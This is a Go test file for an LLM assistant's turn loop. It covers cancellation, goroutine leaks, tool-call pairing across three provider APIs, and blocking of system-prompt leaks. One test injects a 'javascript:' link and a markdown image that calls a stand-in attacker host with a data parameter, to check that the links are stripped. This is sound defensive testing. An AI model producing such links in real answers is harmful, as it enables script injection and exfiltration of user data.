// carried note 3:驗證器不理會 ctx 卡住 → 逾時照樣結束,不會卡到外部 abort。
func TestTurnVerifierHangTimesOut(t *testing.T) {
	release := make(chan struct{})
	t.Cleanup(func() { close(release) })
	v := func(context.Context, string, VerifyCtx) (string, error) { <-release; return "x", nil }
	h := newTurnH(turnOpts{script: []stubp.Step{{Text: "答"}}, verifiers: []Verifier{v}, timeout: 30 * time.Millisecond})
	start := time.Now()
	out := h.run(t, nil, userMsg("hi", entity.Local))
	if time.Since(start) > time.Second {
		t.Fatal("卡住的驗證器拖住了 turn")
	}
	eqStrs(t, h.rec.ends(), []string{"timeout"})
	if len(out.Messages) != 1 {
		t.Fatal("逾時不該留下回答", out.Messages)
	}
}

// carried note 6:空字串或短句的 allow 會讓外洩偵測失效 → 輪開始前就拒絕,不送任何事件。
func TestTurnLeakAllowValidation(t *testing.T) {
	for _, bad := range []string{"", "   ", "的", "短短的一句", "a b c d e f g h i j k l m n o p", "--------------------------"} {
		h := newTurnH(turnOpts{script: []stubp.Step{{Text: "ok"}}})
		h.deps.LeakAllow = []string{"這一句夠長,可以被允許出現在回答裡面沒有問題的", bad}
		if _, err := RunTurn(context.Background(), nil, userMsg("hi", entity.Local), h.deps); err == nil {
			t.Fatalf("%q 沒被拒絕", bad)
		}
		if len(h.rec.evs()) != 0 {
			t.Fatal("拒絕時不該送事件")
		}
		if ValidateLeakAllow([]string{bad}) == nil {
			t.Fatalf("ValidateLeakAllow(%q)", bad)
		}
	}
	h := newTurnH(turnOpts{script: []stubp.Step{{Text: "ok"}}})
	h.deps.LeakAllow = []string{"這一句夠長,可以被允許出現在回答裡面沒有問題的"}
	h.run(t, nil, userMsg("hi", entity.Local))
	eqStrs(t, h.rec.ends(), []string{"done"})
}

// settledGoroutines:等 goroutine 數穩定再取基準(前一個測試的收尾可能還在跑)。
func settledGoroutines() int {
	n := runtime.NumGoroutine()
	for range 100 {
		time.Sleep(10 * time.Millisecond)
		m := runtime.NumGoroutine()
		if m == n {
			return n
		}
		n = m
	}
	return n
}

func waitGoroutines(t *testing.T, base int) {
	t.Helper()
	deadline := time.Now().Add(time.Second)
	for runtime.NumGoroutine() > base {
		if time.Now().After(deadline) {
			buf := make([]byte, 1<<16)
			t.Fatalf("goroutine 洩漏:基準 %d,現在 %d\n%s", base, runtime.NumGoroutine(), buf[:runtime.Stack(buf, true)])
		}
		time.Sleep(5 * time.Millisecond)
	}
}

// runAsync 在背景跑一輪,回傳結果的 channel;取消後 1 秒內沒回來就失敗(不能等卡住的 hook)。
func runAsync(h *turnH, ctx context.Context, user entity.Message) <-chan TurnResult {
	ch := make(chan TurnResult, 1)
	go func() {
		res, _ := RunTurn(ctx, nil, user, h.deps)
		ch <- res
	}()
	return ch
}

func awaitTurn(t *testing.T, ch <-chan TurnResult) TurnResult {
	t.Helper()
	select {
	case r := <-ch:
		return r
	case <-time.After(time.Second):
		t.Fatal("取消後 turn 沒有馬上返回")
	}
	return TurnResult{}
}

// Review Focus 2 / carried note 2:取消後馬上返回;不理會 ctx 的 hook 回來後不留任何 goroutine。不用 t.Parallel。
func TestTurnAbortNoGoroutineLeak(t *testing.T) {
	local := entity.Local
	cases := []struct {
		name string
		// mk 回 turn 設定;started 收到值代表卡住的地方已經進去;release 放掉不理會 ctx 的 hook
		mk func(started chan<- struct{}, release <-chan struct{}) *turnH
	}{
		{"串流理會 ctx", func(started chan<- struct{}, _ <-chan struct{}) *turnH {
			p := &fakeLLM{privacy: local, stream: func(ctx context.Context, _ LLMRequest, yield func(LLMEvent) bool) {
				if !yield(LLMEvent{Type: LLMEventTextDelta, Text: "a"}) {
					return
				}
				started <- struct{}{}
				<-ctx.Done()
				yield(doneEv(nil, local, "aborted"))
			}}
			return newTurnH(turnOpts{provider: p})
		}},
		{"串流不理會 ctx", func(started chan<- struct{}, release <-chan struct{}) *turnH {
			p := &fakeLLM{privacy: local, stream: func(_ context.Context, _ LLMRequest, yield func(LLMEvent) bool) {
				started <- struct{}{}
				<-release
				_ = yield(LLMEvent{Type: LLMEventTextDelta, Text: "late"}) && yield(doneEv(nil, local, "stop"))
			}}
			return newTurnH(turnOpts{provider: p})
		}},
		{"工具不理會 ctx", func(started chan<- struct{}, release <-chan struct{}) *turnH {
			tool := echoTool(nil)
			tool.Execute = func(context.Context, map[string]any, entity.ToolCtx) (entity.ToolOutput, error) {
				started <- struct{}{}
				<-release
				return entity.ToolOutput{Content: "late"}, nil
			}
			return newTurnH(turnOpts{script: []stubp.Step{{ToolCall: &stubp.Call{Name: "t"}}}, tool: &tool})
		}},
		{"驗證器不理會 ctx", func(started chan<- struct{}, release <-chan struct{}) *turnH {
			v := func(context.Context, string, VerifyCtx) (string, error) {
				started <- struct{}{}
				<-release
				return "late", nil
			}
			return newTurnH(turnOpts{script: []stubp.Step{{Text: "答"}}, verifiers: []Verifier{v}})
		}},
		{"複核的 Ask 串流不理會 ctx", func(started chan<- struct{}, release <-chan struct{}) *turnH {
			n := 0
			p := &fakeLLM{privacy: local, stream: func(_ context.Context, _ LLMRequest, yield func(LLMEvent) bool) {
				if n++; n == 1 {
					yield(doneEv([]entity.Part{textPart("答 555.5 元")}, local, "stop"))
					return
				}
				started <- struct{}{}
				<-release
				yield(doneEv([]entity.Part{textPart("[]")}, local, "stop"))
			}}
			return newTurnH(turnOpts{provider: p, verifiers: []Verifier{NumberVerifier(0)}})
		}},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			base := settledGoroutines()
			started, release := make(chan struct{}, 1), make(chan struct{})
			h := c.mk(started, release)
			ctx, cancel := context.WithCancel(context.Background())
			ch := runAsync(h, ctx, userMsg("hi", local))
			select {
			case <-started:
			case <-time.After(2 * time.Second):
				t.Fatal("沒有進到卡住的地方")
			}
			cancel()
			res := awaitTurn(t, ch) // 還沒 release:turn 不等不理會 ctx 的 hook
			if res.StopReason != "aborted" {
				t.Fatal(res.StopReason)
			}
			eqStrs(t, h.rec.ends(), []string{"aborted"})
			calls, results := toolCallIDs(res.Messages)
			eqStrs(t, results, calls)
			for _, m := range res.Messages {
				if m.Role == entity.RoleToolResult && (entity.TextOf(m) != "已中止" || !m.IsError) {
					t.Fatalf("取消時的工具結果:%+v", m)
				}
			}
			close(release)
			waitGoroutines(t, base)
		})
	}
}

// carried note 1:不理會 ctx 的 Execute 與 Ask 在取消之後才寫,寫不進共用的 MaskSet / NumberBook;-race 無警告。
// 測試 goroutine 在放掉它們的同時改共用狀態,讓 -race 有機會抓到。
func TestTurnLateWritesRaceClean(t *testing.T) {
	hammer := func(h *turnH, stop <-chan struct{}) <-chan struct{} {
		done := make(chan struct{})
		go func() {
			defer close(done)
			for {
				select {
				case <-stop:
					return
				default:
				}
				h.deps.MaskSet.Add([]float64{1})
				_ = h.deps.MaskSet.Values()
				h.deps.NumberBook.Add([]float64{2})
				h.deps.NumberBook.AddData("x")
				_ = h.deps.NumberBook.Context(nil)
				runtime.Gosched()
			}
		}()
		return done
	}

	t.Run("Execute 與 Collect(local)", func(t *testing.T) {
		started, release, returned := make(chan struct{}, 1), make(chan struct{}), make(chan struct{})
		tool := echoTool(nil)
		tool.Execute = func(context.Context, map[string]any, entity.ToolCtx) (entity.ToolOutput, error) {
			defer close(returned)
			started <- struct{}{}
			<-release
			return entity.ToolOutput{Content: "late", Details: map[string]any{"late": 777.25}}, nil
		}
		masking := Masking{Collect: func(string, any) ([]float64, error) { return []float64{4242}, nil }}
		h := newTurnH(turnOpts{script: []stubp.Step{{ToolCall: &stubp.Call{Name: "t"}}}, tool: &tool, masking: masking})
		base := settledGoroutines()
		ctx, cancel := context.WithCancel(context.Background())
		ch := runAsync(h, ctx, userMsg("hi", entity.Local))
		<-started
		cancel()
		awaitTurn(t, ch)
		stop := make(chan struct{})
		done := hammer(h, stop)
		close(release)
		<-returned
		waitGoroutines(t, base+1) // +1:hammer
		close(stop)
		<-done
		if h.deps.MaskSet.Has(4242) || slices.Contains(h.deps.NumberBook.Values(), 777.25) {
			t.Fatal("取消後的工具結果寫進了共用狀態")
		}
	})

	t.Run("Ask 送出途中被取消:卡在 Snapshot,取消後才寫(remote)", func(t *testing.T) {
		started, release, returned := make(chan struct{}, 1), make(chan struct{}), make(chan struct{})
		var calls atomic.Int32
		masking := Masking{Snapshot: func() ([]float64, error) {
			if calls.Add(1) == 1 { // 主請求的 PrepareRequest
				return nil, nil
			}
			started <- struct{}{} // Ask 的 PrepareRequest
			<-release
			return []float64{31337}, nil
		}}
		v := func(ctx context.Context, s string, vc VerifyCtx) (string, error) {
			defer close(returned)
			_, _ = vc.Ask(ctx, "s", "u")
			return s, nil
		}
		p := stubp.New(stubp.Options{Privacy: entity.Remote, Script: &[]stubp.Step{{Text: "答"}, {Text: "[]"}}})
		h := newTurnH(turnOpts{provider: p, masking: masking, verifiers: []Verifier{v}})
		base := settledGoroutines()
		ctx, cancel := context.WithCancel(context.Background())
		ch := runAsync(h, ctx, userMsg("hi", entity.Remote))
		<-started
		cancel()
		if res := awaitTurn(t, ch); res.StopReason != "aborted" {
			t.Fatal(res.StopReason)
		}
		stop := make(chan struct{})
		done := hammer(h, stop)
		close(release)
		<-returned
		waitGoroutines(t, base+1)
		close(stop)
		<-done
		if h.deps.MaskSet.Has(31337) {
			t.Fatal("取消後 Ask 的 snapshot 寫進了共用 MaskSet")
		}
	})

	t.Run("驗證器與 Ask、Snapshot(remote)", func(t *testing.T) {
		started, release, returned := make(chan struct{}, 1), make(chan struct{}), make(chan struct{})
		var late atomic.Bool
		masking := Masking{Snapshot: func() ([]float64, error) {
			if late.Load() {
				return []float64{31337}, nil
			}
			return nil, nil
		}}
		v := func(ctx context.Context, s string, vc VerifyCtx) (string, error) {
			defer close(returned)
			started <- struct{}{}
			<-release
			_ = vc.Mask("x 31337")
			_ = vc.ToolData()
			_ = vc.KnownNumbers()
			_, _ = vc.Ask(context.Background(), "s", "u")
			return s, nil
		}
		p := stubp.New(stubp.Options{Privacy: entity.Remote, Script: &[]stubp.Step{{Text: "答"}, {Text: "[]"}}})
		h := newTurnH(turnOpts{provider: p, masking: masking, verifiers: []Verifier{v}})
		base := settledGoroutines()
		ctx, cancel := context.WithCancel(context.Background())
		ch := runAsync(h, ctx, userMsg("hi", entity.Remote))
		<-started
		cancel()
		awaitTurn(t, ch)
		late.Store(true)
		stop := make(chan struct{})
		done := hammer(h, stop)
		close(release)
		<-returned
		waitGoroutines(t, base+1)
		close(stop)
		<-done
		if h.deps.MaskSet.Has(31337) {
			t.Fatal("取消後的 snapshot 寫進了共用 MaskSet")
		}
	})
}

// Review Focus 2:Anthropic 串流在 tool_use 之後斷掉 → 歷史每個 toolCall 都有結果,
// 而且三家 provider 經 Stream 送出的 request body 裡每個 tool_use / tool_calls / functionCall 都有配對結果。
func TestTurnStreamBreakPairsToolCalls(t *testing.T) {
	sse := func(evs ...string) string {
		var b strings.Builder
		for _, e := range evs {
			b.WriteString("data: " + e + "\n\n")
		}
		return b.String()
	}
	fixture := func(name string) string {
		b, err := os.ReadFile("../../../testdata/" + name)
		if err != nil {
			t.Fatal(err)
		}
		return string(b)
	}
	var mu sync.Mutex
	bodies := map[string][]map[string]any{}
	anthropicN := 0
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		b, _ := io.ReadAll(r.Body)
		var body map[string]any
		_ = json.Unmarshal(b, &body)
		var kind, out string
		switch {
		case r.URL.Path == "/v1/messages":
			kind = "anthropic"
			mu.Lock()
			anthropicN++
			first := anthropicN == 1
			mu.Unlock()
			if first { // 沒有 message_delta(stop_reason):串流提前結束
				out = sse(`{"type":"message_start","message":{"usage":{"input_tokens":1}}}`,
					`{"type":"content_block_start","index":0,"content_block":{"type":"tool_use","id":"tu_1","name":"t"}}`,
					`{"type":"content_block_stop","index":0}`)
			} else {
				out = sse(`{"type":"message_start","message":{}}`, `{"type":"content_block_start","index":0,"content_block":{"type":"text"}}`,
					`{"type":"content_block_delta","index":0,"delta":{"type":"text_delta","text":"hi"}}`, `{"type":"content_block_stop","index":0}`,
					`{"type":"message_delta","delta":{"stop_reason":"end_turn"}}`)
			}
		case r.URL.Path == "/chat/completions":
			kind, out = "openai", fixture("openai_text.sse")
		case strings.HasPrefix(r.URL.Path, "/v1beta/"):
			kind, out = "google", fixture("google_text.sse")
		}
		mu.Lock()
		bodies[kind] = append(bodies[kind], body)
		mu.Unlock()
		w.Header().Set("content-type", "text/event-stream")
		_, _ = io.WriteString(w, out)
	}))
	defer srv.Close()

	cfg := func(name, api string) repository.ProviderConfig {
		return repository.ProviderConfig{Name: name, API: api, Model: "m", BaseURL: srv.URL, APIKey: "k"}
	}
	providers := map[string]LLMProvider{
		"anthropic": anthropic.New(cfg("a", "anthropic-messages"), anthropic.Deps{HTTP: srv.Client()}),
		"openai":    openai.New(cfg("o", "openai-completions"), openai.Deps{HTTP: srv.Client()}),
		"google":    google.New(cfg("g", "google-generative-ai"), google.Deps{HTTP: srv.Client()}),
	}
	var calls []map[string]any
	tool := echoTool(&calls)
	h := newTurnH(turnOpts{provider: providers["anthropic"], tool: &tool})
	first := h.run(t, nil, userMsg("hi", entity.Remote))
	if first.StopReason != "error" || len(calls) != 0 {
		t.Fatal(first.StopReason, calls)
	}
	ids, results := toolCallIDs(first.Messages)
	eqStrs(t, ids, []string{"tu_1"})
	eqStrs(t, results, ids)

	for _, name := range []string{"anthropic", "openai", "google"} {
		h.setProvider(providers[name])
		res := h.run(t, first.Messages, userMsg("再問", entity.Remote))
		if res.StopReason != "done" {
			t.Fatal(name, res.StopReason, res.Messages)
		}
	}

	mu.Lock()
	defer mu.Unlock()
	arr := func(v any) []any { a, _ := v.([]any); return a }
	obj := func(v any) map[string]any { m, _ := v.(map[string]any); return m }
	// 每個 body 都至少有一個呼叫,且每個呼叫都在緊接著的結果裡配對到
	checkPaired := func(name string, body map[string]any, msgsKey string, callsOf func(m map[string]any) []string, next func(msgs []any, i int) []string) {
		msgs := arr(body[msgsKey])
		n := 0
		for i, m := range msgs {
			cs := callsOf(obj(m))
			if len(cs) == 0 {
				continue
			}
			n += len(cs)
			got := next(msgs, i)
			slices.Sort(cs)
			slices.Sort(got)
			if !slices.Equal(cs, got) {
				t.Fatalf("%s:呼叫 %q 沒有配對結果 %q", name, cs, got)
			}
		}
		if n == 0 {
			t.Fatalf("%s:body 裡沒有工具呼叫", name)
		}
	}
	// Anthropic:assistant 的 tool_use → 下一則 user 的 tool_result
	blocks := func(m map[string]any, typ, key string) []string {
		var out []string
		for _, b := range arr(m["content"]) {
			if obj(b)["type"] == typ {
				s, _ := obj(b)[key].(string)
				out = append(out, s)
			}
		}
		return out
	}
	aBodies := bodies["anthropic"]
	if len(aBodies) != 2 {
		t.Fatal(len(aBodies))
	}
	checkPaired("anthropic", aBodies[1], "messages",
		func(m map[string]any) []string { return blocks(m, "tool_use", "id") },
		func(msgs []any, i int) []string {
			if i+1 >= len(msgs) {
				return nil
			}
			return blocks(obj(msgs[i+1]), "tool_result", "tool_use_id")
		})
	// OpenAI:assistant 的 tool_calls → 緊接著的 tool 訊息
	checkPaired("openai", bodies["openai"][0], "messages",
		func(m map[string]any) []string {
			var out []string
			for _, c := range arr(m["tool_calls"]) {
				s, _ := obj(c)["id"].(string)
				out = append(out, s)
			}
			return out
		},
		func(msgs []any, i int) []string {
			var out []string
			for _, m := range msgs[i+1:] {
				if obj(m)["role"] != "tool" {
					break
				}
				s, _ := obj(m)["tool_call_id"].(string)
				out = append(out, s)
			}
			return out
		})
	// Google:model 的 functionCall → 下一則 user 的 functionResponse(依名稱與數量配對)
	parts := func(m map[string]any, key string) []string {
		var out []string
		for _, p := range arr(m["parts"]) {
			if f := obj(obj(p)[key]); f != nil {
				s, _ := f["name"].(string)
				out = append(out, s)
			}
		}
		return out
	}
	checkPaired("google", bodies["google"][0], "contents",
		func(m map[string]any) []string { return parts(m, "functionCall") },
		func(msgs []any, i int) []string {
			if i+1 >= len(msgs) || obj(msgs[i+1])["role"] != "user" {
				return nil
			}
			return parts(obj(msgs[i+1]), "functionResponse")
		})
}

// I5/m18:被放棄的驗證器在 RunTurn 返回之後才呼叫 Ask → errStopped,不扣額度。
// 檢查 ctx 與 Spend 在 turn 的鎖裡做,RunTurn 返回前先關門,所以「Prompt 返回後不再扣額度」沒有空窗。
func TestTurnAskAfterReturnNoSpend(t *testing.T) {
	started, release := make(chan struct{}, 1), make(chan struct{})
	askErr := make(chan error, 1)
	v := func(_ context.Context, _ string, vc VerifyCtx) (string, error) {
		started <- struct{}{}
		<-release
		_, err := vc.Ask(context.Background(), "s", "u")
		askErr <- err
		return "late", nil
	}
	h := newTurnH(turnOpts{script: []stubp.Step{{Text: "答"}}, verifiers: []Verifier{v}})
	ctx, cancel := context.WithCancel(context.Background())
	ch := runAsync(h, ctx, userMsg("hi", entity.Local))
	<-started
	cancel()
	if res := awaitTurn(t, ch); res.StopReason != "aborted" {
		t.Fatal(res.StopReason)
	}
	before := h.deps.Budget.Snapshot().Session
	close(release)
	if err := <-askErr; !errors.Is(err, ErrStopped) {
		t.Fatal(err)
	}
	if after := h.deps.Budget.Snapshot().Session; after != before {
		t.Fatalf("RunTurn 返回後還扣了額度:%d → %d", before, after)
	}
}

// 裁決 G19 邊界:正規化後剛好 20 個 UTF-16 code unit 的 allow 收,19 個拒。含一個 astral 字元(2 個 code unit),
// 確定數的是 UTF-16 而不是 rune。
func TestTurnLeakAllowBoundary(t *testing.T) {
	astral := "\U00020000" // 𠀀
	ok20 := astral + strings.Repeat("允", 18)
	bad19 := astral + strings.Repeat("允", 17)
	for s, n := range map[string]int{ok20: 20, bad19: 19} {
		if got := entity.UTF16Len(entity.NormalizeLeak(s)); got != n {
			t.Fatalf("前提:%q 正規化後 %d 個 code unit,應為 %d", s, got, n)
		}
	}
	if utf8.RuneCountInString(ok20) != 19 {
		t.Fatal("前提:20 個 code unit 的那句只有 19 個 rune")
	}
	if err := ValidateLeakAllow([]string{ok20}); err != nil {
		t.Fatal(err)
	}
	if ValidateLeakAllow([]string{bad19}) == nil {
		t.Fatal("19 個 code unit 應該拒絕")
	}
	h := newTurnH(turnOpts{script: []stubp.Step{{Text: "ok"}}})
	h.deps.LeakAllow = []string{ok20}
	h.run(t, nil, userMsg("hi", entity.Local))
	eqStrs(t, h.rec.ends(), []string{"done"})
}

// 裁決 G20:工具不理會 ctx 時中止 → 先送 tool_end(isError、「已中止」),turn_end 是最後一個事件;
// 放掉被放棄的 Execute、等它的 goroutine 結束後,turn_end 之後仍然沒有任何事件。
func TestTurnAbortEventOrder(t *testing.T) {
	started, release := make(chan struct{}, 1), make(chan struct{})
	tool := echoTool(nil)
	tool.Execute = func(context.Context, map[string]any, entity.ToolCtx) (entity.ToolOutput, error) {
		started <- struct{}{}
		<-release
		return entity.ToolOutput{Content: "late"}, nil
	}
	h := newTurnH(turnOpts{script: []stubp.Step{{ToolCall: &stubp.Call{Name: "t"}}}, tool: &tool})
	base := settledGoroutines()
	ctx, cancel := context.WithCancel(context.Background())
	ch := runAsync(h, ctx, userMsg("hi", entity.Local))
	<-started
	cancel()
	if res := awaitTurn(t, ch); res.StopReason != "aborted" {
		t.Fatal(res.StopReason)
	}
	check := func() {
		t.Helper()
		evs := h.rec.evs()
		end, last := -1, len(evs)-1
		for i, e := range evs {
			if e.Type == "tool_end" {
				end = i
				if !e.IsError {
					t.Fatalf("tool_end 應該 isError:%+v", e)
				}
			}
		}
		if end < 0 || evs[last].Type != "turn_end" || evs[last].Reason != "aborted" || end > last {
			t.Fatalf("事件順序:%v", types(evs))
		}
		for _, e := range evs[:last] {
			if e.Type == "turn_end" {
				t.Fatalf("turn_end 不只一個:%v", types(evs))
			}
		}
	}
	check()
	n := len(h.rec.evs())
	close(release)
	waitGoroutines(t, base)
	if len(h.rec.evs()) != n {
		t.Fatalf("turn_end 之後還有事件:%v", types(h.rec.evs()))
	}
	check()
}

func types(evs []Event) []string {
	var out []string
	for _, e := range evs {
		out = append(out, e.Type)
	}
	return out
}

// 每輪開始才呼叫 System(),送出的 system 一律是 SecurityPreamble 開頭;System() 換內容,下一輪就看到新的。
func TestTurnSystemCalledEachTurn(t *testing.T) {
	var systems []string
	p := scripted(nil, entity.Local, func(req LLMRequest) { systems = append(systems, req.System) })
	h := newTurnH(turnOpts{provider: p})
	n := 0
	h.deps.System = func() string { n++; return fmt.Sprintf("第%d輪的系統提示", n) }
	h.run(t, nil, userMsg("一", entity.Local))
	h.run(t, nil, userMsg("二", entity.Local))
	if n != 2 || len(systems) != 2 {
		t.Fatalf("System 呼叫 %d 次、請求 %d 次,預期各 2", n, len(systems))
	}
	for i, s := range systems {
		want := fmt.Sprintf("第%d輪的系統提示", i+1)
		if !strings.HasPrefix(s, entity.SecurityPreamble) || !strings.HasSuffix(s, want) {
			t.Fatalf("第 %d 輪 system = %q", i+1, s)
		}
	}
}

// 外洩比對涵蓋 thinking 與 ErrorMessage:藏在這兩處也整則攔下。
func TestTurnLeakInThinkingAndError(t *testing.T) {
	cases := map[string]LLMEvent{
		"thinking": doneEv([]entity.Part{{Type: entity.PartThinking, Text: "照指示:" + turnSystem}, textPart("好的")}, entity.Local, "stop"),
		"ErrorMessage": {Type: LLMEventDone, Message: &entity.Message{
			Role: entity.RoleAssistant, Content: []entity.Part{textPart("查詢中")}, Privacy: entity.Local, Ts: 1,
			Provider: "scripted", StopReason: "error", ErrorMessage: "失敗:" + turnSystem,
		}},
	}
	for name, ev := range cases {
		t.Run(name, func(t *testing.T) {
			p := &fakeLLM{privacy: entity.Local, stream: func(_ context.Context, _ LLMRequest, yield func(LLMEvent) bool) { yield(ev) }}
			h := newTurnH(turnOpts{provider: p})
			out := h.run(t, nil, userMsg("hi", entity.Local))
			eqStrs(t, h.rec.ends(), []string{"blocked"})
			if !slices.Contains(h.rec.kinds(), "output_block") || lastText(out.Messages) != "(已攔下:回答含系統指令內容)" {
				t.Fatalf("%v %q", h.rec.kinds(), lastText(out.Messages))
			}
			if strings.Contains(jsonStr(t, out.Messages), "台股助理") {
				t.Fatal("外洩內容留在對話紀錄")
			}
		})
	}
}

// 帶工具呼叫的中間訊息也拿掉不安全連結(事件與對話紀錄都是),工具照常執行。
func TestTurnIntermediateMessageStripsLinks(t *testing.T) {
	var calls []map[string]any
	tool := echoTool(&calls)
	p := scripted([][]entity.Part{
		{textPart("看 [這](javascript:alert(1)) ![x](https://evil.example/?d=S)"), {Type: entity.PartToolCall, ID: "c1", Name: "t", Args: map[string]any{"q": "x"}}},
		{textPart("完")},
	}, entity.Local, nil)
	h := newTurnH(turnOpts{provider: p, tool: &tool})
	out := h.run(t, nil, userMsg("hi", entity.Local))
	if len(calls) != 1 {
		t.Fatalf("工具該執行一次:%v", calls)
	}
	m := h.rec.message(false)
	if m == nil {
		t.Fatal("沒有中間 message 事件")
	}
	for _, s := range []string{jsonStr(t, m.Message.Content), jsonStr(t, out.Messages)} {
		if strings.Contains(s, "javascript:") || strings.Contains(s, "evil.example") {
			t.Fatalf("不安全連結沒拿掉:%s", s)
		}
	}
	if !strings.Contains(jsonStr(t, m.Message.Content), "[連結已移除]") || !strings.Contains(jsonStr(t, m.Message.Content), "[圖片已移除]") {
		t.Fatalf("%s", jsonStr(t, m.Message.Content))
	}
}
